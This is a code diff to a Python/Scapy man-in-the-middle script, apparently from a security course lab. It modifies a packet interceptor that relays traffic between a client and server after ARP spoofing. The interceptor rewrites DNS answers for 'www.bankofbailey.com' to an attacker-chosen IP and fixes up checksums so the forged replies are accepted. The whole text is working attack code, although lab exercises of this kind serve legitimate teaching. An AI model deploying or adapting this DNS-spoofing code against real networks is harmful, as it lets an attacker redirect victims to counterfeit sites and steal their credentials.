@@ -53,19 +53,21 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
 # TODO: handle intercepted packets
 def interceptor(packet):
 	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
-	if(packet.haslayer(IP)):
-		if(packet[IP].src == serverIP and packet[IP].dst == clientIP):
-			if(packet.haslayer(DNSRR)):
+	if packet[Ether].src == attackerMAC:
+		return
+	if packet.haslayer(IP):
+		if packet[IP].src == serverIP and packet[IP].dst == clientIP:
+			if packet.haslayer(DNSRR):
 				hostname = ''.join(chr(i) for i in packet[DNS].qd.qname)
-				if(hostname == 'www.bankofbailey.com.' and packet[DNS].an is not None):
+				if hostname == 'www.bankofbailey.com.' and packet[DNS].an is not None:
 					packet[DNS].an.rdata = '10.4.63.200'
-					print("change record to 10.4.63.200")
 					del packet[UDP].chksum
 					del packet[UDP].len
 					del packet[IP].chksum
 					del packet[IP].len
 			packet[Ether].dst = clientMAC
-		elif(packet[IP].dst == serverIP):
+			packet.show2(dump=True)
+		elif packet[IP].dst == serverIP:
 			packet[Ether].dst = serverMAC
 		packet[Ether].src = attackerMAC
 		sendp(packet)
